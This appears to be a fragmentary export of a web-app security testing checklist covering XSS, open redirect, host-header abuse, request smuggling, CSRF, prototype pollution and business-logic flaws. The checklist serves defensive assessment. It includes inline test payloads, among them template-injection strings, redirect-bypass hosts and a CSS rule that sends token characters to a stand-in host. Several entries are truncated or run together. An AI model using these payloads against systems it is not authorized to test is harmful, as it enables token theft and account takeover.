items.title: Test for mutation XSS (mXSS)

items.title: Test for client-side template/framework XSS
items.description: Client-side template engines (AngularJS, Vue, Handlebars) can evaluate expressions, turning injection into execution. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Probe for client-side template injection ({{constructor.constructor("alert(1)")()}} in AngularJS sandbox-escape style, or unescaped v-html/triple-mustache). Confirm expression evaluation in the rendered DOM. Common tags: xss, client-side-template, framework.

Client-side template engines (AngularJS, Vue, Handlebars) can evaluate expressions, turning injection into execution. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Probe for client-side template injection ({{constructor.constructor("alert(1)")()}} in AngularJS sandbox-escape style, or unescaped v-html/triple-mustache). Confirm expression evaluation in the rendered DOM. Common tags: xss, client-side-template, framework. Use Burp Proxy to intercept requests, send to Repeater/Intruder, and mutate one variable at a time. Review client-side validation separately - always confirm server-side enforcement.
items.how_to_fix: Fix root cause for "Test for client-side template/framework XSS": apply secure defaults, server-side validation, and defense in depth. For auth issues: enforce MFA, secure session cookies (HttpOnly, Secure, SameSite), and rate limits. For injection: parameterized queries, output encoding, CSP, and allowlists. Re-test after patch and add regression tests.

items.title: Test for parameter-based open redirect
items.description: Redirect parameters that accept arbitrary external URLs let an attacker control the destination. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Find redirect params (returnUrl, next, url, dest, redirect, continue) and set them to https://evil.example; confirm a 30x or client-side redirect to the external host. Note GET vs POST and login/logout flows. Common tags: open-redirect, phishing, cwe-601.

items.title: Test for header-based redirect
items.description: Redirects driven by request headers (Referer, custom routing headers) can be abused where a parameter is not obvious. This is a defense-in-depth gap that improves overall resilience when fixed. Assessors should confirm the control in practice, not only on paper: Manipulate headers that influence post-action redirects (Referer, X-Forwarded-Host) and meta-refresh/Location values; confirm the response sends users to an attacker-controlled destination. Common tags: open-redirect, headers, cwe-601.

items.title: Test redirect filter bypass techniques
items.description: Naive validators that allow-list a substring or only block http(s) can be bypassed with URL tricks. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Try //evil.com, https:evil.com, backslash-prefixed hosts, evil.com%2f@trusted.com, trusted.com.evil.com, @evil.com, whitespace/control chars, and double-encoding to defeat host validation. Confirm final navigation lands on the attacker host. Common tags: open-redirect, evasion, bypass.

items.title: Test open redirect in OAuth/SSO chains
items.description: An open redirect on an allow-listed redirect_uri can leak OAuth codes/tokens, escalating to account takeover. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Chain an open redirect within the OAuth flow (redirect_uri or post-login redirect) to exfiltrate the authorization code/token via Referer or the redirect destination. Confirm the leaked code can be exchanged. Common tags: open-redirect, oauth, account-takeover.

items.title: Test password-reset poisoning
items.description: If reset links are built from the Host header, an attacker can make the link point at their server and steal tokens. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Trigger a password reset while setting Host (or X-Forwarded-Host) to an attacker domain; check whether the emailed reset link uses that host so the victim leaks the token to you on click. Common tags: host-header, account-takeover, cwe-644.

items.title: Test for web cache poisoning
items.description: A reflected Host/forwarding header cached in a response can serve attacker-controlled content to other users. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Identify reflected, unkeyed headers (X-Forwarded-Host, X-Host) that change cached output, then poison a cacheable response so other users receive attacker-controlled links/scripts. Confirm via cache hit indicators. Common tags: host-header, cache-poisoning, cwe-444.

items.title: Test for routing-based SSRF via Host
items.description: Front-end proxies that route by Host can be tricked into forwarding requests to internal systems. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Set the Host header to internal hostnames/IPs (e.g. 169.254.169.254, internal service names) and observe whether the front end routes the request internally, returning internal responses or metadata. Common tags: host-header, ssrf, owasp-a10.

items.title: Test for web cache deception
items.description: Tricking caches into storing authenticated pages under static-looking paths can expose private data. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Append static-looking suffixes/paths (e.g. /account/profile.css or ;.js) to authenticated endpoints and check whether the cache stores the personalized response, then retrieve it unauthenticated. Common tags: host-header, cache-deception, information-disclosure.

items.title: Test X-Forwarded-Host and related header abuse
items.description: Apps often trust forwarding headers even when the Host header is validated, reopening the same attacks. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: When Host is filtered, test X-Forwarded-Host, X-Forwarded-Server, X-Host, X-Original-URL, and duplicate Host headers; observe reflection in links, redirects, and cached content to find an exploitable trust path. Common tags: host-header, x-forwarded-host, cwe-644.

items.title: Apply smuggling detection methodology
items.description: Timing-based and differential probes reveal whether front-end and back-end disagree on request length. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Use timing probes (CL.TE and TE.CL variants) where a smuggled body forces the back end to wait for more data, indicated by a response delay. Confirm with safe, repeatable detection before attempting confirmation. Common tags: request-smuggling, detection, cwe-444.

items.title: Test for CL.TE smuggling
items.description: Front end uses Content-Length while back end uses Transfer-Encoding, allowing a request prefix to be smuggled. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Send a request with both Content-Length and Transfer-Encoding: chunked where the front end honors CL and the back end honors TE; confirm the smuggled prefix affects the next request/response. Common tags: request-smuggling, cl-te, cwe-444.

items.title: Test for TE.CL smuggling
items.description: Front end uses Transfer-Encoding while back end uses Content-Length, enabling a different smuggling primitive. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Craft a chunked request the front end processes via TE and the back end via CL; verify a smuggled request reaches the back end by observing its effect on a following victim request. Common tags: request-smuggling, te-cl, cwe-444.

items.title: Test for TE.TE (obfuscated TE) smuggling
items.description: Both servers support Transfer-Encoding but one can be tricked into ignoring it via header obfuscation. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Obfuscate the Transfer-Encoding header (e.g. duplicated TE, unusual whitespace, "Transfer-Encoding: xchunked", or value casing) so only one server processes it, then exploit the resulting CL/TE disagreement. Common tags: request-smuggling, te-te, obfuscation.

items.title: Test for HTTP/2 downgrade smuggling
items.description: When HTTP/2 is rewritten to HTTP/1.1 at the back end, header/length ambiguities reintroduce smuggling. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Send HTTP/2 requests with crafted CL/TE or injected pseudo-headers/CRLF that, after downgrade, desync the back end. Use HTTP/2-specific probes (h2.CL, h2.TE) to confirm request splitting. Common tags: request-smuggling, http2, downgrade.

items.title: Test for request tunnelling
items.description: Even without full desync, smuggling techniques can tunnel an extra request through a single front-end connection to probe the back end. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Use request tunnelling to send a hidden second request on the same connection and read its back-end response (e.g. via reflected differences), useful for internal header discovery and front-end bypass. Common tags: request-smuggling, tunnelling, cwe-444.

items.title: Test for response queue poisoning
items.description: A complete smuggled request can desync the response queue so users receive each other's responses, leaking sensitive data. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Smuggle a full request to shift the response queue and confirm a victim receives a response intended for your request (or vice versa). Demonstrate capture of another response carefully and ethically. Common tags: request-smuggling, response-queue-poisoning, cwe-444.

items.title: Detect serialized data and deserialization sinks
items.description: Recognizing serialized formats in cookies, params, and tokens is the first step to finding deserialization flaws. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Look for serialized markers: Java (rO0/ac ed 00 05 magic), PHP (O:/a:/s: patterns), .NET (AAEAAAD or ViewState), Python pickle, Ruby Marshal. Identify where the app deserializes user-controlled values. Common tags: deserialization, detection, owasp-a08.

sections.title: Client-Side Security — DOM Clobbering & Markup Injection

items.title: Test for DOM clobbering
items.description: Injected id/name attributes can overwrite JavaScript variables and properties the page expects to control, redirecting logic to attacker values. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Where the app allows some HTML but strips script, inject named elements (e.g. <a id=x>, <form name=config>, nested forms with name/id) that shadow globals the page reads (config URLs, callbacks); confirm the clobbered value reaches a sink or weakens a security check. Common tags: dom-clobbering, dom, html-injection.

items.title: Test for CSS injection and style-based exfiltration
items.description: Attacker-controlled CSS can read attribute values (CSRF tokens, hidden inputs) via attribute selectors and conditional background requests, leaking data without JavaScript. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Where style/CSS is injectable, use attribute selectors with background: url() (e.g. input[value^="a"]{background:url(//evil/a)}) to brute-force token characters; confirm exfil callbacks. Also test @import and font-based leak primitives. Common tags: css-injection, exfiltration, html-injection.

items.title: Test for reverse tabnabbing
items.description: Links opened with target=_blank but without rel="noopener" let the destination page rewrite the opener via window.opener.location, enabling phishing. This is a defense-in-depth gap that improves overall resilience when fixed. Assessors should confirm the control in practice, not only on paper: Find user-controlled or external links opened in a new tab; confirm rel="noopener noreferrer" (or that the browser default applies). Demonstrate window.opener access where missing. Common tags: tabnabbing, phishing, noopener.

items.title: Test for client-side path traversal
items.description: Untrusted input concatenated into a client-built request path can redirect API calls to unintended endpoints, chaining with CSRF or reflected sinks for self-XSS escalation. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Identify where the SPA builds fetch/XHR paths from URL params or storage; inject ../ or %2e%2e%2f to redirect the request to a different endpoint (e.g. a state-changing or reflected one) and confirm the altered path is sent. Common tags: client-side-path-traversal, dom, csrf.

items.title: Test for Cross-Site WebSocket Hijacking (CSWSH)
items.description: A handshake that relies only on cookies, with no Origin check or CSRF token, can be hijacked cross-site. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Initiate the WS handshake from a foreign origin; if it authenticates via cookies without Origin/token validation, it is hijackable. Common tags: websockets, cswsh, csrf.

items.title: Verify Origin validation on the WS handshake
items.description: The server must validate the Origin header during the upgrade handshake. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Send the upgrade with a foreign Origin; confirm the server rejects untrusted origins. Common tags: websockets, origin.

items.title: Test WebSocket messages for injection

Common tags: websockets, injection, xss.

items.title: Verify sensitive responses are not cached
items.description: Authenticated/sensitive responses cached by browsers or proxies leak on shared machines. This is a defense-in-depth gap that improves overall resilience when fixed. Assessors should confirm the control in practice, not only on paper: Confirm Cache-Control: no-store (and Pragma: no-cache where needed) on authenticated/sensitive responses. Common tags: caching, cache-control, headers.

items.title: Verify anti-CSRF tokens on state-changing requests
items.description: Without an unpredictable per-session/request token, state-changing requests can be forged. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Confirm POST/PUT/DELETE (and state-changing GETs) carry an anti-CSRF token that is unpredictable and bound to the user session. Common tags: csrf, owasp-a01, session.

items.title: Test CSRF token validation strength
items.description: Tokens that are not validated, optional, reusable, or not tied to the user enable bypass. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Remove the token, send an empty token, reuse another user’s token, and swap the request method; confirm each is rejected. Common tags: csrf, bypass, validation.

items.title: Assess over-reliance on SameSite cookies
items.description: SameSite=Lax/None alone may not stop CSRF (top-level GET, method tricks, sibling subdomains). While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Check whether CSRF defense depends only on SameSite; test GET-based state change and same-site bypass vectors. Common tags: csrf, samesite, cookies.

items.title: Test JSON / content-type CSRF defenses
items.description: If a JSON endpoint also accepts simple content types, it may be CSRF-able from a form. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Replay the action as text/plain or form-encoded and from a cross-site form; confirm the server enforces content-type and CSRF protection. Common tags: csrf, json, api.

items.title: Test for login and logout CSRF
items.description: Login CSRF can force a victim into an attacker-controlled session; logout CSRF disrupts sessions. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Attempt to submit the login and logout flows cross-site without a valid CSRF token. Common tags: csrf, authentication, session.

items.title: Identify client-side prototype-pollution sources
items.description: User-controllable input merged into objects via __proto__/constructor.prototype pollutes Object.prototype. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Inject __proto__[test]=x via URL/query/JSON and check whether Object.prototype.test appears globally. Common tags: prototype-pollution, dom, javascript.

items.title: Chain a pollution source to a gadget (DOM XSS)

Assessors should confirm the control in practice, not only on paper: Find a gadget (e.g. a property read into innerHTML/script src) reachable from the polluted prototype and demonstrate impact. Common tags: prototype-pollution, dom-xss, gadget.

items.title: Skipping required workflow steps
items.description: Checkout, onboarding, or KYC flows that gate logic only in the UI can be completed by calling a later endpoint directly. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Request a final-step endpoint (e.g. order confirmation) without completing prerequisite steps. Confirm the server rejects the request when prior state is missing. Common tags: business-logic, workflow.

items.title: Out-of-order request submission
items.description: Submitting workflow requests in an unexpected order can reach a state the application assumed unreachable. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Reorder the requests of a multi-step flow and observe whether the server enforces a strict state machine or accepts arbitrary ordering. Common tags: business-logic, workflow, state-machine.

items.title: Replaying completed steps
items.description: Re-submitting a step that should be one-time (e.g. apply credit, confirm order) can repeat its effect when the server is not idempotent. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Replay a completed step request multiple times and confirm the effect is applied only once (idempotency keys, server-side state checks). Common tags: business-logic, workflow, idempotency.

items.title: Forced state transition
items.description: Directly setting a status field (e.g. order=shipped, account=verified) lets a user force a transition that should be system-controlled. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Look for status/state parameters in requests and attempt to transition an object to a privileged state. Confirm the server owns and validates state transitions. Common tags: business-logic, workflow, state-machine.

items.title: Negative quantity abuse
items.description: Negative quantities can invert charges or credit a balance when the server multiplies price by an unvalidated quantity. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Submit negative quantities in cart/order requests and inspect the computed total. Confirm the server rejects non-positive quantities. Common tags: business-logic, payments, input-validation.

items.title: Decimal / rounding abuse
items.description: Fractional cents, many-decimal inputs, or favorable rounding can be exploited to reduce totals or accumulate value. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Submit prices/quantities with extra decimal precision and edge values; verify the server rounds consistently and to the customer’s disadvantage on ambiguity. Common tags: business-logic, payments, rounding.

items.title: Currency confusion
items.description: Mismatching the currency parameter from the price source (e.g. paying in a weaker currency at a stronger currency’s number) can underpay. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Change the currency parameter independently of the amount and confirm the server re-derives price and currency together, rejecting mismatches. Common tags: business-logic, payments, currency.

items.title: Client-supplied price trust
items.description: When the price or total is taken from the request rather than recomputed server-side, an attacker simply sets the amount they want to pay. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Modify price/total/amount fields in checkout requests and confirm the server recomputes them from authoritative product data, ignoring the client value. Common tags: business-logic, payments, client-trust.

items.title: Integer overflow on totals
items.description: Very large quantities or prices can overflow integer arithmetic, wrapping a total to a small or negative value. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Submit extreme integer quantities/prices and observe totals for wraparound. Confirm the server uses safe arithmetic and bounds inputs. Common tags: business-logic, integer, payments.

items.title: TOCTOU (time-of-check to time-of-use)
items.description: A gap between validating a condition and acting on it lets concurrent requests slip through with stale state. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Identify a check-then-act flow (balance check then debit) and fire concurrent requests to land between the check and the use. Confirm the operation is atomic. Common tags: business-logic, race-condition, concurrency.

items.title: Limit overrun (coupon / gift-card double spend)

Assessors should confirm the control in practice, not only on paper: Fire parallel requests at a single-use action (redeem coupon, spend gift card, withdraw) and confirm the limit is enforced atomically, not per-request. Common tags: business-logic, race-condition, payments.

items.title: Parallel request abuse
items.description: Bulk parallel requests can race shared state (counters, inventory, rate buckets) into an inconsistent result. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Send many concurrent requests against shared mutable state and check for over-allocation, double-counting, or negative inventory. Common tags: business-logic, race-condition, concurrency.

items.title: Single-packet attack
items.description: HTTP/2 single-packet (last-byte synchronization) eliminates network jitter, exposing narrow race windows that timing alone would miss. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Use a single-packet race technique to dispatch many requests simultaneously and confirm tight race windows are still protected by atomic operations or locks. Common tags: business-logic, race-condition, http2.

items.title: Missing rate limits
items.description: Sensitive endpoints with no throttling allow unbounded automated attacks (brute force, scraping, spam). Common tags: business-logic, rate-limiting, anti-automation.

items.title: Bypass via header / IP rotation

items.title: Hidden-field tampering
items.description: Hidden form fields (price, user id, discount, role) are fully attacker-controlled and must never be trusted server-side. items.title: Find exposed backup archives

items.title: Find exposed CI/CD configuration
items.description: Deployed CI files (.gitlab-ci.yml, workflows, Jenkinsfile) reveal build logic, internal hosts, and sometimes tokens. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Probe for CI config paths in the web root and repository; review for internal endpoints, credentials, and pipeline structure. Common tags: cicd-secrets, ci-cd, config.

items.title: Detect hardcoded secrets in the repo
items.description: Committed credentials, tokens, and keys in source or history are directly abusable and persist in git history. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Scan accessible source and git history for secret patterns and high-entropy strings; validate any discovered secret. Common tags: cicd-secrets, secrets, source-leak.

items.title: Assess dependency-confusion risk
items.description: Internal package names referenced in manifests can be hijacked on public registries to achieve code execution in builds. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Identify internal/private package names in exposed manifests and check whether they are unclaimed on public registries. Common tags: cicd-secrets, supply-chain, dependency-confusion.

items.title: Detect dangling DNS records
items.description: DNS entries pointing to deprovisioned resources can be reclaimed by an attacker to serve content under the domain. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Resolve all subdomains and flag those pointing to non-resolving or unclaimed backend resources. Common tags: subdomain-takeover, dns, config.

items.title: Find CNAMEs to unclaimed providers
items.description: CNAMEs to SaaS providers with no active account allow an attacker to claim the resource and take over the host. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inspect CNAME targets and match provider fingerprints/error pages indicating an unclaimed, claimable resource. Common tags: subdomain-takeover, cname, config.

items.title: Verify takeover safely and responsibly

items.title: Check for delegated NS takeover
items.description: Subdomains delegated to nameservers on an unclaimed/expired zone can be fully controlled by an attacker. items.title: Test dangerous HTTP methods (PUT/DELETE)
items.description: Enabled PUT/DELETE can let an attacker write, replace, or remove server files and resources. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Send OPTIONS to enumerate allowed methods, then test PUT/DELETE against writable paths to confirm impact. Common tags: http-methods, config, server.

items.title: Test HTTP method override
items.description: Override headers (X-HTTP-Method-Override) and verb tunneling can reach restricted methods through allowed ones. Common tags: http-methods, override, config.

items.how_to_find: In scope: map all inputs, headers, cookies, and API parameters in "OWASP WSTG — Authentication Testing". Test case: Testing for Bypassing Authentication Schema. Ensure that authentication is applied across all services that require it. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Use Burp Proxy to intercept requests, send to Repeater/Intruder, and mutate one variable at a time. Review client-side validation separately - always confirm server-side enforcement.
items.how_to_fix: Fix root cause for "Testing for Bypassing Authentication Schema": apply secure defaults, server-side validation, and defense in depth. For auth issues: enforce MFA, secure session cookies (HttpOnly, Secure, SameSite), and rate limits. For injection: parameterized queries, output encoding, CSP, and allowlists. Re-test after patch and add regression tests.

Determine whether the API relies on client-side filtering rather than server-side field selection to control data exposure. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Use Burp Proxy to intercept requests, send to Repeater/Intruder, and mutate one variable at a time. Review client-side validation separately - always confirm server-side enforcement.
items.how_to_fix: Fix root cause for "Testing for Excessive Data Exposure": apply secure defaults, server-side validation, and defense in depth. For auth issues: enforce MFA, secure session cookies (HttpOnly, Secure, SameSite), and rate limits. For injection: parameterized queries, output encoding, CSP, and allowlists. Re-test after patch and add regression tests.

items.title: API Broken Function Level Authorization
items.description: The goal of this test is to determine if the API enforces **role or privilege-based access control** to restrict users from accessing or executing functions they are not authorized to use. This ensures that function-level security boundaries are properly enforced. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint.
